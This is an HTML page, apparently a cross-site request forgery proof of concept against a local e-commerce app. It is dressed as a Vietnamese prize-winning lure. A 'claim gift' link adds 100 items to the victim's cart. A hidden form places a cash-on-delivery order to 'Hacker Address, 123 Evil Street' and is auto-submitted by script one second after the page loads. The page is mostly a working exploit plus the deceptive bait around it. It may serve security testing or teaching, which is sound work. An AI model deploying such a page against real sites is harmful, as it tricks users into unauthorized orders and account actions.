<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chúc Mừng Bạn Trúng Thưởng!</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 600px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            padding: 30px;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            color: #e91e63;
            font-weight: bold;
            margin-bottom: 20px;
        }
        p {
            color: #555;
            font-size: 1.1rem;
            margin-bottom: 30px;
        }
        .btn-primary {
            background-color: #e91e63;
            border: none;
            padding: 12px 30px;
            font-size: 1.2rem;
            border-radius: 25px;
            transition: transform 0.2s, background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: #d81b60;
            transform: scale(1.05);
        }
        .btn-success {
            background-color: #28a745;
            border: none;
            padding: 12px 30px;
            font-size: 1.2rem;
            border-radius: 25px;
            transition: transform 0.2s, background-color 0.3s;
        }
        .btn-success:hover {
            background-color: #218838;
            transform: scale(1.05);
        }
        .gift-icon {
            font-size: 3rem;
            color: #e91e63;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .alert-info {
            background-color: #e3f2fd;
            border: none;
            color: #0d47a1;
            font-size: 1rem;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <i class="fas fa-gift gift-icon"></i>
        <h1>Chúc Mừng Bạn Trúng Thưởng!</h1>
        <div class="alert alert-info">
            Bạn đã được chọn để nhận <strong>ưu đãi đặc biệt</strong>! Nhấn vào các nút dưới đây để nhận ngay quà tặng hấp dẫn!
        </div>
        <p>Chỉ cần một cú nhấp chuột, bạn sẽ nhận được phần quà bất ngờ từ chúng tôi!</p>
        
        <!-- Liên kết giả mạo gửi yêu cầu GET tới endpoint addToCart -->
        <a href="http://localhost:8099/user/cart/addToCart?id=1&quantity=100&size=M" class="btn btn-primary mb-3">
            <i class="fas fa-gift me-2"></i> Nhận Quà
        </a>

        <!-- Biểu mẫu giả mạo gửi yêu cầu tới endpoint thanh toán -->
        <form action="http://localhost:8099/user/checkout/checkout-by-COD" method="POST" id="csrfForm">
            <input type="hidden" name="address" value="Hacker Address, 123 Evil Street" />
            <input type="hidden" name="deliveryId" value="1" /> <!-- Thay bằng deliveryId hợp lệ -->
            <button type="submit" class="btn btn-success">
                <i class="fas fa-gift me-2"></i> Nhận Quà
            </button>
        </form>
        
        <!-- Tự động gửi biểu mẫu khi trang được tải -->
        <script>
            setTimeout(() => {
                document.getElementById("csrfForm").submit();
            }, 1000); // Chậm 1 giây để tạo cảm giác tự nhiên
        </script>
    </div>

    <!-- Bootstrap 5 JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
</body>
</html>
